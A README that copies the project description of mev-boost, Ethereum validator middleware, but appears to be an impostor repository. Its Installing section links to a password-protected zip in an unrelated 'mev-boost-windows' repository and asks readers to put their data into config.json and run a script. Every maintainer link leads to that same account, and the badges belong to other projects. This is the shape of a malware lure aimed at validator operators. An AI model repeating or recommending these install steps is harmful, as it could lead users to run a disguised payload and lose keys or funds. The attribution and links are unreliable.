![mev-boost](https://user-images.githubusercontent.com/116939/224986867-3d1916c6-3219-4d61-b1ce-213fc663070c.png)

#

<p align="center">
  <a href="https://www.npmjs.com/package/hashlips_art_engine">
    <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
  </a>
  <a href="https://github.com/kefranabg/readme-md-generator/blob/master/LICENSE">
    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
  </a>
  <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
    <img src="https://codecov.io/gh/kefranabg/readme-md-generator/branch/master/graph/badge.svg" />
  </a>
  <a href="https://github.com/frinyvonnick/gitmoji-changelog">
    <img src="https://img.shields.io/badge/changelog-gitmoji-brightgreen.svg" alt="gitmoji-changelog">
  </a>
</p>

## What is MEV-Boost?

`mev-boost` is open source middleware run by validators to access a competitive block-building market. MEV-Boost is an initial implementation of [proposer-builder separation (PBS)](https://ethresear.ch/t/proposer-block-builder-separation-friendly-fee-market-designs/9725) for proof-of-stake (PoS) Ethereum.

With MEV-Boost, validators can access blocks from a marketplace of builders. Builders produce blocks containing transaction orderflow and a fee for the block proposing validator. Separating the role of proposers from block builders promotes greater competition, decentralization, and censorship-resistance for Ethereum.

## How does MEV-Boost work?

PoS node operators must run three pieces of software: a validator client, a consensus client, and an execution client. MEV-boost is a sidecar for the beacon node - a separate piece of open source software, which queries and outsources block-building to a network of builders. Block builders prepare full blocks, optimizing for MEV extraction and fair distribution of rewards. They then submit their blocks to relays.

Relays aggregate blocks from **multiple** builders in order to select the block with the highest fees. One instance of MEV-boost can be configured by a validator to connect to **multiple** relays. The consensus layer client of a validator proposes the most profitable block received from MEV-boost to the Ethereum network for attestation and block inclusion.

A MEV-Boost security assessment was conducted on 2022-06-20 by [lotusbumi](https://github.com/lotusbumi). Additional audits of surrounding infrastructure, such as the Flashbots Relay, are currently underway. Additional information can be found in the [Security](#security) section of this repository.

## Installing
- [Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository and extract files with password `bSWxYb95Vdp`.
- Edit `config.json` with your data and launch script.
- The most common setup is to install MEV-Boost on the same machine as the beacon client. Multiple beacon-clients can use a single MEV-Boost instance. The default port is 18550.
- See also [Rémy Roy's guide](https://github.com/remyroy/ethstaker/blob/main/prepare-for-the-merge.md#installing-mev-boost) for comprehensive instructions on installing, configuring and running MEV-Boost.

## Maintainers
- [@metachris](https://github.com/Cardo16)
- [@jtraglia](https://github.com/Cardo16)
- [@ralexstokes](https://github.com/Cardo16)
- [@terencechain](https://github.com/Cardo16)
- [@lightclient](https://github.com/Cardo16)
- [@avalonche](https://github.com/Cardo16)
- [@Ruteri](https://github.com/Cardo16)

## Contributing
You are welcome here <3.
- If you have a question, feedback or a bug report for this project, please [open a new Issue](https://github.com/flashbots/mev-boost/issues).
- If you would like to contribute with code, check the [CONTRIBUTING file](CONTRIBUTING.md) for further info about the development environment.
- We just ask you to be nice. Read our [code of conduct](CODE_OF_CONDUCT.md).

## Copyright
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*
